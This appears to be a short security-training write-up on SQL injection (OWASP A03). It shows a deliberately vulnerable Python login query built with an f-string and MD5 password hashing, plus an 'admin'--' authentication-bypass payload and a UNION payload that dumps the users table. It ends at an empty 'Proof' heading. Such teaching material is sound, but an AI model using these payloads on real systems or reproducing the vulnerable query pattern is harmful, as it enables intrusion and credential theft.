# A03 — Injection (SQL Injection)

## What it is

SQL injection occurs when user-supplied input is embedded directly into
a SQL query without sanitisation. An attacker can manipulate the query
structure to bypass authentication, extract data, or modify records.

## Vulnerable code

```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{md5(password)}'"
user = db.execute(query).fetchone()
```

## Exploit

### Authentication bypass

Input: username = `admin'--`, password = anything

The resulting query becomes:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='...'
```

The `--` comments out the password check entirely. Returns admin user.

### UNION-based extraction

Input: username = `' UNION SELECT id, username, password, role FROM users WHERE '1'='1`

Forces the query to return all rows from the users table, including
password hashes — without knowing any credentials.

Running `python -m exploits.01_sqli`:

## Proof
